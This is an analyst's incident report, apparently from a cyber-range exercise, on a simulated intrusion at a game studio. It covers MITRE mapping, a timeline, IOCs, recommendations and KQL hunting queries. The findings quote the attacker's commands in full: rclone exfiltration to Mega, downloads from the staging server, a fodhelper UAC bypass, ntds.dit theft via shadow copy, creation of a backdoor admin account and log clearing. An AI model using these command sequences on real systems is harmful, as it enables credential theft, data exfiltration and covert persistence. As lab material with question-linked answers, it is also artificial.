# EmberForge: Source Code Leak
### Incident Reference: IR-2026-0131-EF
**Analyst:** Adetola Kols | Cybersecurity Analyst  
**Platform:** Microsoft Sentinel | Workspace: law-cyber-range  
**Incident Date:** 31 January 2026  
**Report Written on:** 09 April 2026  
**Investigation Window:** 2026-01-30 21:00 UTC to 2026-01-31 00:00 UTC  
**Severity:** CRITICAL  
**Status:** Completed

---

## Table of Contents
1. [Executive Summary](#executive-summary)
2. [Environment Overview](#environment-overview)
3. [Incident Trigger](#incident-trigger)
4. [MITRE ATT&CK Mapping](#mitre-attck-mapping)
5. [Investigation Findings](#investigation-findings)
   - [Phase 1: Initial Access](#phase-1-initial-access)
   - [Phase 2: Execution](#phase-2-execution)
   - [Phase 3: Privilege Escalation](#phase-3-privilege-escalation)
   - [Phase 4: Lateral Movement](#phase-4-lateral-movement)
   - [Phase 5: Collection and Exfiltration](#phase-5-collection-and-exfiltration)
   - [Phase 6: Persistence and Defence Evasion](#phase-6-persistence-and-defence-evasion)
6. [Attack Timeline](#attack-timeline)
7. [Indicators of Compromise](#indicators-of-compromise)
8. [Investigative Challenges](#investigative-challenges)
9. [Recommendations](#recommendations)
10. [KQL Reference](#kql-reference)

---

## Executive Summary

EmberForge Studios, a game development subsidiary, suffered a targeted intrusion resulting in the theft of unreleased source code for the title "Neon Shadows." The stolen material appeared on underground forums, triggering an emergency investigation.

My investigation confirmed a full domain compromise spanning all three hosts on the `emberforge.local` domain. The attacker gained initial access via a spear-phishing ISO file delivered to Lead Artist Lisa Martin (`lmartin`). From her workstation, the attacker escalated privileges, moved laterally to the server and Domain Controller, exfiltrated the entire `C:\GameDev` directory to a Mega cloud storage account, and dumped the Active Directory credential database (`ntds.dit`).

**The attacker maintained persistence through AnyDesk remote access software, a scheduled task named `WindowsUpdate`, and a backdoor domain administrator account (`svc_backup`). This was not an opportunistic attack. Lisa Martin was specifically targeted.**

### Key Findings at a Glance

| Item | Detail |
|---|---|
| Compromised User | `lmartin` (Lead Artist, EmberForge Studios) |
| Attack Type | Targeted spear-phish via ISO delivery |
| Hosts Compromised | All 3: Workstation, Server, Domain Controller |
| Data Exfiltrated | `C:\GameDev` (archived as `gamedev.zip`, uploaded to Mega) |
| Exfiltration Destination | Mega cloud storage via `rclone.exe` to `66.203.125.15` |
| Credentials Compromised | Domain-wide via `ntds.dit` dump |
| Backdoor Account Created | `svc_backup` (Domain Admin) |
| C2 Infrastructure | `cdn.cloud-endpoint.net` resolving to `104.21.30.237` and `172.67.174.46` |
| Staging Server | `sync.cloud-endpoint.net:8080` |
| Attacker Email | `jwilson.vhr@proton.me` |
| Persistence Mechanisms | AnyDesk, scheduled task `WindowsUpdate`, backdoor account |
| Evidence Gaps | Security and System event logs cleared on DC via `wevtutil` |

---

## Environment Overview

| Field | Value |
|---|---|
| SIEM Platform | Microsoft Sentinel |
| Workspace | law-cyber-range |
| Log Table | EmberForgeX_CL |
| Log Sources | Sysmon (Operational) + Windows Security Events |
| Domain | emberforge.local |
| Key Fields | Computer, EventCode_s, CommandLine_s, Channel_s, Caller_User_Name_s, Raw_s |

### Hosts in Scope

| Role | Hostname | IP Address |
|---|---|---|
| Workstation | EC2AMAZ-B9GHH06.emberforge.local | 10.1.173.145 |
| Server | EC2AMAZ-16V3AU4.emberforge.local | 10.1.57.66 |
| Domain Controller | EC2AMAZ-EEU3IA2.emberforge.local | 10.1.168.76 |

---

## Incident Trigger

Unreleased source code from EmberForge Studios' upcoming title "Neon Shadows" was identified on underground forums on 31 January 2026 at 08:15 UTC. The leaked material included proprietary game engine components. An external threat intelligence feed flagged the exposure, prompting immediate engagement of the incident response process. The CISO confirmed Lead Artist Lisa Martin had reported unusual workstation behaviour prior to the discovery.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access | Spearphishing via ISO/Mounted Image | T1566 / T1553.005 | `review.dll` loaded from `D:\` (mounted ISO bypassing MotW) |
| Execution | Rundll32 | T1218.011 | `rundll32.exe D:\review.dll,StartW` |
| Execution | Command and Scripting Interpreter | T1059.001 | PowerShell `Compress-Archive`, certutil downloads |
| Persistence | Scheduled Task | T1053.005 | `schtasks /create /tn WindowsUpdate` |
| Persistence | Create Account | T1136.002 | `net user svc_backup /add /domain` |
| Persistence | Remote Access Software | T1219 | AnyDesk installed silently across all hosts |
| Privilege Escalation | UAC Bypass via fodhelper | T1548.002 | Registry key `ms-settings\shell\open\command` hijacked |
| Privilege Escalation | Process Injection | T1055 | `update.exe > spoolsv.exe (NT AUTHORITY\SYSTEM)` |
| Defence Evasion | Process Injection | T1055 | `rundll32.exe > notepad.exe` |
| Defence Evasion | Masquerading | T1036 | `update.exe` disguised as Windows update |
| Defence Evasion | Indicator Removal | T1070.001 | `wevtutil cl Security` and `wevtutil cl System` on DC |
| Credential Access | OS Credential Dumping (LSASS) | T1003.001 | `lsass.dmp` written to `C:\Windows\System32\` |
| Credential Access | OS Credential Dumping (NTDS) | T1003.003 | `ntds.dit` copied via VSS shadow copy |
| Discovery | Account Discovery | T1087.002 | `net user /domain` |
| Discovery | Permission Groups Discovery | T1069.002 | `net group "Domain Admins" /domain` |
| Discovery | Remote System Discovery | T1018 | `nltest /dclist:emberforge.local` |
| Lateral Movement | Remote Service Execution | T1569.002 | Impacket psexec service `pGJLIKnC` on server |
| Lateral Movement | SMB/Admin Shares | T1021.002 | `copy update.exe \\10.1.57.66\C$\` |
| Collection | Archive Collected Data | T1560.001 | `Compress-Archive -Path C:\GameDev` |
| Exfiltration | Exfiltration to Cloud Storage | T1567.002 | `rclone.exe` to `mega:exfil` |
| Command and Control | Application Layer Protocol | T1071 | `cdn.cloud-endpoint.net` HTTPS beaconing |
| Command and Control | DNS | T1071.004 | DNS queries to `cdn.cloud-endpoint.net` from all hosts |

---

## Investigation Findings

### Phase 1: Initial Access

**Who:** Lisa Martin (`lmartin`), Lead Artist, EmberForge Studios  
**What:** Execution of a malicious DLL via a trojanised ISO file  
**Where:** Workstation EC2AMAZ-B9GHH06 (10.1.173.145)  
**When:** 2026-01-30 22:43:35 UTC

The attack began with Lisa Martin opening a file from her workstation. The file was delivered inside an ISO disk image, a technique specifically chosen to bypass Windows Mark of the Web (MotW) protections. When an ISO is mounted, Windows assigns it a virtual drive letter. Files executed from this virtual drive do not inherit the MotW flag, meaning SmartScreen and other download-based warnings are suppressed entirely.

The ISO contained an archive that was extracted by `7zG.exe` to:
```
C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\
```

This folder name was crafted to appear as a legitimate project review, consistent with Lisa's role as Lead Artist. The archive contained `review.dll`, which was subsequently executed via:
```
"C:\Windows\System32\rundll32.exe" D:\review.dll,StartW
```

The full execution chain was:
```
explorer.exe > rundll32.exe > review.dll
```

Lisa double-clicked the file from Windows Explorer, which launched `rundll32.exe` to load the malicious DLL. No security warning was presented. This confirms a targeted delivery: the attacker knew Lisa's role, crafted a believable lure, and selected a delivery mechanism designed to evade endpoint defences.

---

### Phase 2: Execution

**What:** Beacon deployment, C2 establishment, and initial reconnaissance  
**Where:** Workstation, then all three hosts  
**When:** 2026-01-30 22:43:03 UTC onwards

Shortly after the DLL executed, a new binary appeared at `C:\Users\Public\update.exe`. This file was downloaded from the attacker's staging server:
```
http://sync.cloud-endpoint.net:8080/update.exe
```

`update.exe` was the attacker's primary Command and Control (C2) implant, masquerading as a Windows update binary. Once running, it established outbound HTTPS connections to:
```
cdn.cloud-endpoint.net
```
which resolved to `104.21.30.237` and `172.67.174.46` (dual-IP load balancing for resilience).

To hide its activity, `update.exe` injected code into `notepad.exe` (initial evasion) and later into `spoolsv.exe` (for SYSTEM-level persistence). Injecting into `spoolsv.exe`, the Windows Print Spooler, is a well-known technique: the process is always running, is trusted by antivirus products, and cannot easily be killed without disrupting printing services.

Immediately upon landing on each new host, the attacker ran `whoami` to confirm their execution context, a standard first step in any post-exploitation workflow.

**Note during investigation:** Identifying `update.exe` as the dropped payload required searching for executables in world-writable directories (`C:\Users\Public`) across all hosts rather than filtering by a specific computer name, as workstation-specific filters were not returning results due to the time field behaviour in the dataset.

---

### Phase 3: Privilege Escalation

**What:** UAC bypass via fodhelper registry hijack, LSASS credential dump  
**Where:** Workstation EC2AMAZ-B9GHH06  
**When:** 2026-01-30 22:43:06 UTC

With initial access established under `lmartin`'s user context, the attacker needed administrative privileges. They achieved this via a UAC bypass using `fodhelper.exe`, a legitimate Windows binary that auto-elevates without prompting the user.

The technique works by writing a malicious payload path to a specific registry key that `fodhelper.exe` reads on launch:

```
HKCU\Software\Classes\ms-settings\shell\open\command\Default = C:\Users\Public\update.exe
HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute = (empty)
```

Setting `DelegateExecute` to empty signals Windows to treat the command as a COM elevation request, causing `fodhelper.exe` to launch `update.exe` with full administrative privileges and no UAC prompt presented to the user.

With elevated privileges, the attacker dumped LSASS memory to capture credentials for all active sessions:
```
C:\Windows\System32\lsass.dmp
```

The dump was performed using direct syscalls to bypass API-level monitoring, meaning traditional LSASS access detection (Sysmon EventCode 10) produced no alerts. The file creation event (EventCode 11) revealed `update.exe` as the writing process.

---

### Phase 4: Lateral Movement

**What:** Tool staging, firewall modification, psexec-style remote execution across server and DC  
**Where:** Workstation to Server (10.1.57.66), Server to DC (10.1.168.76)  
**When:** 2026-01-30 22:36:28 UTC to 22:41:22 UTC

With SYSTEM-level access on the workstation via `spoolsv.exe` injection, all subsequent lateral movement commands ran as children of this trusted process.

The attacker staged tools by:

1. Creating a network share on the workstation:
```
cmd.exe /c "net share tools=C:\Users\Public /grant:everyone,full"
```

2. Adding a firewall rule to allow inbound SMB connections:
```
netsh advfirewall firewall add rule name="SMB" dir=in action=allow protocol=tcp localport=445
```

3. Pushing `update.exe` to the server via admin shares:
```
cmd.exe /c copy C:\Users\Public\update.exe \\10.1.57.66\C$\Users\Public\update.exe
```

The initial lateral movement attempt to the server used NTLM authentication, which failed repeatedly. This is consistent with pass-the-hash failures, suggesting the first credential set used was not valid for the target. The attacker subsequently used Impacket's psexec implementation, which creates a temporary Windows service on the target host to achieve remote code execution. The service name on the server was identified as `pGJLIKnC`, registered under:
```
HKLM\System\CurrentControlSet\Services\pGJLIKnC
```

**Investigative note:** This was one of the more challenging findings in the hunt. EventCode 7045 (Windows service installation) was not present in the Sysmon-only dataset. The service name was ultimately located by querying Sysmon EventCode 13 (registry set value) for random-string entries under the Services registry path.

On both the server and DC, the attacker mapped a network drive to the workstation tools share using credentials exposed in plaintext:
```
net use Z: \\10.1.173.145\tools /user:EMBERFORGE\Administrator EmberForge2024!
```

Upon landing on each new host, `certutil` was used to download additional tools from the staging server, and `whoami` was run to confirm execution context.

---

### Phase 5: Collection and Exfiltration

**What:** Source code archiving, credential database theft, cloud upload via rclone  
**Where:** Server (collection), Mega cloud storage (destination)  
**When:** 2026-01-30 22:37:17 UTC to 22:38:50 UTC

The attacker identified and archived the entire game development source directory using a native Windows cmdlet:
```
powershell.exe -c "Compress-Archive -Path C:\GameDev -DestinationPath C:\Users\Public\gamedev.zip"
```

Using a built-in OS utility rather than third-party compression tools is a Living Off the Land (LOtL) technique designed to avoid triggering software allowlist controls.

The archive was uploaded to Mega cloud storage using `rclone.exe`, a legitimate cloud synchronisation tool commonly abused for data exfiltration due to its support for anonymous cloud providers and its appearance as normal HTTPS traffic:
```
C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\Users\Public\gamedev.zip mega:exfil -v
```

The rclone configuration was built on-host using `cmd.exe` echo commands, exposing the attacker's Mega credentials in plaintext in the process logs:

| Field | Value |
|---|---|
| Cloud Provider | Mega |
| Attacker Email | `jwilson.vhr@proton.me` |
| Plaintext Password | `Summer2024!` |
| Exfil Destination IP | `66.203.125.15` |

On the Domain Controller, the attacker accessed the Active Directory credential database by creating a Volume Shadow Copy of the C: drive, bypassing the live file lock on `ntds.dit`:
```
vssadmin create shadow /For=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\nyMdRNSp.tmp
```

The shadow copy was deleted after extraction to remove evidence:
```
vssadmin delete shadows /shadow="{0ed56514-fe1b-4ef9-a2b1-d468122c1920}" /Quiet
```

With `ntds.dit` exfiltrated, the attacker has offline access to every domain credential hash. All domain accounts must be treated as compromised.

---

### Phase 6: Persistence and Defence Evasion

**What:** AnyDesk installation, scheduled task, backdoor domain admin account, log clearing  
**Where:** All three hosts  
**When:** 2026-01-30 22:36:13 UTC to 22:43:59 UTC

The attacker established multiple persistence mechanisms to ensure continued access even if the initial beacon was detected and removed:

**1. AnyDesk Remote Access**
AnyDesk was silently installed across all three hosts:
```
C:\Users\Public\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
```
The configuration file was read and modified at `C:\ProgramData\AnyDesk\system.conf`, enabling unattended remote access.

**2. Scheduled Task**
A scheduled task was created on the workstation and DC, named to blend in with legitimate Windows maintenance:
```
schtasks /create /tn WindowsUpdate /tr C:\Users\Public\update.exe /sc onstart /ru system
```
This ensures the C2 beacon restarts automatically on every system reboot, running as SYSTEM.

**3. Backdoor Domain Administrator Account**
A new domain account was created with a password set in plaintext on the command line:
```
net user svc_backup P@ssw0rd123! /add /domain
net group "Domain Admins" svc_backup /add /domain
```
The username `svc_backup` was chosen to blend in with legitimate service accounts.

**4. Log Clearing on the Domain Controller**
The attacker used `wevtutil` to clear both the Security and System event logs on the DC:
```
wevtutil cl Security
wevtutil cl System
```
This occurred at 22:36:20 UTC, very early in the DC compromise, indicating the attacker was operationally aware of forensic artefacts. Critically, Sysmon logs to its own independent channel (`Microsoft-Windows-Sysmon/Operational`) which was not cleared, allowing full reconstruction of the attack chain despite the evidence tampering attempt.

---

## Attack Timeline

```
22:36:13  DC  -  wevtutil cl Security / System (anti-forensics)
22:36:29  SRV -  net share tools /delete (cleanup from prior session)
22:36:40  DC  -  update.exe copied from Z: drive
22:37:02  DC  -  net group "Domain Admins" svc_backup /add /domain
22:37:08  DC  -  net user svc_backup P@ssw0rd123! /add /domain
22:37:17  DC  -  vssadmin / ntds.dit extraction
22:37:18  DC  -  vssadmin create shadow / delete shadows
22:38:17  SRV -  AnyDesk config read (system.conf)
22:38:23  SRV -  rclone config written (Mega credentials)
22:38:27  SRV -  Compress-Archive C:\GameDev > gamedev.zip
22:38:44  SRV -  AnyDesk installed silently
22:38:50  SRV -  rclone exfil to mega:exfil (66.203.125.15)
22:39:25  WKS -  Firewall rule "SMB" added (port 445 inbound)
22:39:33  WKS -  net share tools=C:\Users\Public /grant:everyone,full
22:40:39  SRV -  certutil download update.exe from sync.cloud-endpoint.net
22:41:08  SRV -  Impacket service pGJLIKnC registered
22:41:22  WKS -  update.exe pushed to SRV via C$
22:42:29  WKS -  update.exe injects into spoolsv.exe (NT AUTHORITY\SYSTEM)
22:42:47  WKS -  lsass.dmp written to C:\Windows\System32\
22:42:55  WKS -  schtasks /create WindowsUpdate persistence
22:43:03  WKS -  update.exe first execution
22:43:06  WKS -  fodhelper.exe UAC bypass triggered
22:43:08  WKS -  ms-settings registry hijack (DelegateExecute)
22:43:16  WKS -  nltest /dclist:emberforge.local
22:43:17  WKS -  net user /domain
22:43:22  WKS -  rundll32.exe injects into notepad.exe
22:43:35  WKS -  rundll32.exe D:\review.dll,StartW (INITIAL ACCESS)
22:43:40  WKS -  7zG.exe extracts EmberForge_Review archive
```

> Note: TimeGenerated in Sentinel reflects ingestion time (2026-02-10). UtcTime_s values above reflect actual event timestamps (2026-01-30).

---

## Indicators of Compromise

### Network IOCs

| Type | Value | Context |
|---|---|---|
| Domain | `cdn.cloud-endpoint.net` | C2 beacon domain |
| Domain | `sync.cloud-endpoint.net` | Attacker staging server |
| IP | `104.21.30.237` | C2 resolved IP |
| IP | `172.67.174.46` | C2 resolved IP (load balanced) |
| IP | `66.203.125.15` | Mega exfiltration endpoint |
| IP | `239.255.102.18` | Anomalous non-standard port connections (50001-50003) - flagged for further investigation |
| URL | `http://sync.cloud-endpoint.net:8080/update.exe` | Beacon download |
| URL | `http://sync.cloud-endpoint.net:8080/AnyDesk.exe` | AnyDesk download |
| Email | `jwilson.vhr@proton.me` | Attacker Mega account |

### Host IOCs

| Type | Value | Context |
|---|---|---|
| File | `C:\Users\Public\update.exe` | C2 beacon (all hosts) |
| File | `D:\review.dll` | Initial access payload |
| File | `C:\Users\Public\rclone.exe` | Exfiltration tool |
| File | `C:\Users\Public\rclone.conf` | Rclone config with plaintext credentials |
| File | `C:\Users\Public\gamedev.zip` | Exfiltrated archive |
| File | `C:\Windows\System32\lsass.dmp` | LSASS credential dump |
| File | `C:\Windows\Temp\nyMdRNSp.tmp` | ntds.dit staging copy |
| File | `C:\ProgramData\AnyDesk\system.conf` | AnyDesk configuration |
| Registry | `HKCU\Software\Classes\ms-settings\shell\open\command` | UAC bypass key |
| Account | `svc_backup` | Backdoor domain admin account |
| Password | `P@ssw0rd123!` | svc_backup password |
| Password | `Summer2024!` | Mega account password |
| Password | `EmberForge2024!` | EMBERFORGE\Administrator plaintext |
| Service | `pGJLIKnC` | Impacket temporary service (server) |
| Task | `WindowsUpdate` | Malicious scheduled task |

---

## Investigative Challenges

Two areas required additional investigation effort that are worth documenting for transparency and learning:

**1. Workstation Time Filter Behaviour**
Early queries against the workstation (`EC2AMAZ-B9GHH06`) using `todatetime(UtcTime_s)` returned no results. Investigation revealed that `UtcTime_s` was unpopulated for some workstation events. The correct approach was to use `TimeGenerated` for workstation events or use `todatetime(UtcTime_s)` only after confirming field population per host. This is a real-world data quality issue common in heterogeneous log collection environments.

**2. Impacket Service Name (Q32)**
The question required identifying the temporary service created by Impacket psexec on the server. The expected log source (Windows System EventID 7045) was not present in the Sysmon-only dataset. After exhausting multiple approaches, the service name `pGJLIKnC` was located via Sysmon EventCode 13 (registry set value), which captured the service registration under `HKLM\System\CurrentControlSet\Services\pGJLIKnC\ImagePath`. This demonstrates that creative pivoting across available log sources can compensate for gaps in log collection scope.

---

## Recommendations

**Immediate (0-24 hours)**

1. Isolate all three hosts from the network immediately.
2. Reset all domain account passwords including all service accounts.
3. Disable and investigate `svc_backup` domain admin account.
4. Block `cdn.cloud-endpoint.net`, `sync.cloud-endpoint.net`, `66.203.125.15`, `104.21.30.237`, and `172.67.174.46` at the perimeter.
5. Revoke and rotate the EMBERFORGE\Administrator credential (`EmberForge2024!`).
6. Notify legal regarding `jwilson.vhr@proton.me` and coordinate with Mega for account investigation.

**Short Term (1-7 days)**

7. Re-image all three compromised hosts from clean baselines.
8. Force domain-wide Kerberos ticket resets (krbtgt password reset twice).
9. Audit all scheduled tasks and services across the domain for persistence artefacts.
10. Remove `svc_backup` from Domain Admins and delete the account.
11. Review and restrict ISO/IMG mounting via Group Policy.
12. Implement application allowlisting to prevent execution from `C:\Users\Public`.

**Strategic (7-30 days)**

13. Enable Windows System event log collection in Sentinel to capture EventID 7045 and 4625.
14. Deploy Credential Guard to prevent LSASS memory access.
15. Implement Privileged Access Workstations (PAW) for all domain admin activity.
16. Conduct mandatory phishing awareness training targeting file-based lures.
17. Investigate the `239.255.102.18` connections on ports 50001-50003 for potential secondary C2 channel.

---

## KQL Reference

All queries use the `EmberForgeX_CL` table in the `law-cyber-range` Sentinel workspace.

**Standard time filter used throughout:**
```kql
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
```

---

### Compression and Staging (Q01, Q08)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("7z", "zip", "rar", "tar", "compress", "archive")
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| sort by TimeGenerated asc
```

---

### Rclone Configuration and Credentials (Q02, Q03, Q07)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("rclone", "pass", "mega")
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

---

### NTDS Extraction via Shadow Copy (Q04, Q35)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer has "EEU3IA2"
| where CommandLine_s has_any ("shadow", "vss", "ntds", "copy")
| project TimeGenerated, Computer, EventCode_s, CommandLine_s
| sort by TimeGenerated asc
```

---

### C2 Network Connection (Q06)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "3"
| where CommandLine_s has "rclone" or Image_s has "rclone"
| project TimeGenerated, Computer, DestinationIp_s, DestinationPort_s
| sort by TimeGenerated asc
```

---

### Staging Server Downloads (Q09, Q31)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("curl", "wget", "certutil", "bitsadmin", "Invoke-WebRequest", "iwr", "http")
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

---

### LOLBin Execution (Q10 - Initial Malicious File)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("mshta", "wscript", "cscript", "rundll32", "regsvr32", "msiexec")
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

---

### Compromised User via Raw_s Parse (Q12)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where CommandLine_s has "review.dll"
| parse Raw_s with * "User'>" User "<" *
| project TimeGenerated, Computer, User, CommandLine_s
```

---

### Execution Chain - Parent/Child Process (Q13)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where CommandLine_s has "review.dll"
| parse Raw_s with * "ParentImage'>" ParentImage "<" *
| parse Raw_s with * "Image'>" Image "<" *
| project TimeGenerated, Computer, ParentImage, Image, CommandLine_s
```

---

### Dropped Payload in World-Writable Directories (Q15)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| parse Raw_s with * "Image'>" Image "<" *
| where Image has_any ("Public", "Temp", "ProgramData", "AppData")
| project TimeGenerated, Computer, Image, CommandLine_s
| sort by TimeGenerated asc
```

---

### C2 Domain DNS Resolution (Q16, Q17)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "22"
| parse Raw_s with * "Image'>" Image "<" *
| parse Raw_s with * "QueryName'>" QueryName "<" *
| where Image has "update"
| project TimeGenerated, Computer, Image, QueryName
| sort by TimeGenerated asc
```

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "22"
| parse Raw_s with * "QueryName'>" QueryName "<" *
| parse Raw_s with * "QueryResults'>" QueryResults "<" *
| where QueryName has "cdn.cloud-endpoint.net"
| project TimeGenerated, Computer, QueryName, QueryResults
| sort by TimeGenerated asc
```

---

### Process Injection (Q18, Q21)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "8"
| parse Raw_s with * "SourceImage'>" SourceImage "<" *
| parse Raw_s with * "TargetImage'>" TargetImage "<" *
| parse Raw_s with * "TargetUser'>" TargetUser "<" *
| project TimeGenerated, Computer, SourceImage, TargetImage, TargetUser
| sort by TimeGenerated asc
```

---

### UAC Bypass Registry Modification (Q19, Q20)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "13"
| parse Raw_s with * "TargetObject'>" TargetObject "<" *
| parse Raw_s with * "Details'>" Details "<" *
| where TargetObject has_any ("ms-settings", "fodhelper", "eventvwr", "shell\\open\\command")
| project TimeGenerated, Computer, TargetObject, Details
| sort by TimeGenerated asc
```

---

### LSASS Dump File Creation (Q22, Q23)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "11"
| parse Raw_s with * "Image'>" Image "<" *
| parse Raw_s with * "TargetFilename'>" TargetFilename "<" *
| where TargetFilename has_any (".dmp", "lsass", "dump")
| project TimeGenerated, Computer, Image, TargetFilename
| sort by TimeGenerated asc
```

---

### Domain Reconnaissance (Q24, Q25, Q26)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("net user", "Get-ADUser", "dsquery", "whoami", "net group", "nltest", "ipconfig")
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

---

### Tool Staging Share and Firewall Rule (Q27, Q28)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("net share", "New-SmbShare", "netsh", "advfirewall")
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

---

### Beacon Distribution via Admin Shares (Q30)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("C$", "copy", "xcopy", "robocopy")
| where CommandLine_s has "update"
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

---

### Impacket Service Name via Registry (Q32)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "13"
| where Computer has "16V3AU4"
| parse Raw_s with * "TargetObject'>" TargetObject "<" *
| parse Raw_s with * "Details'>" Details "<" *
| where TargetObject has "Services"
| project TimeGenerated, Computer, TargetObject, Details
| sort by TimeGenerated asc
```

---

### Remote Execution Parent Process Chain (Q33)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer has "16V3AU4"
| parse Raw_s with * "ParentImage'>" ParentImage "<" *
| where ParentImage has "services"
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

---

### Backdoor Account Creation (Q36, Q37, Q38)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("net user", "net group")
| where CommandLine_s has_any ("/add", "/domain")
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

---

### Exposed Network Drive Credentials (Q39)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where CommandLine_s has "net use"
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

---

### Scheduled Task Persistence (Q40)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where CommandLine_s has "schtasks"
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

---

### AnyDesk Configuration (Q42)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where CommandLine_s has "AnyDesk" and CommandLine_s has_any ("type", "dir", "conf")
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

---

### Anti-Forensics Log Clearing (Q43, Q44)
```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where CommandLine_s has_any ("wevtutil", "Clear-EventLog", "clearev", "auditpol")
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

---

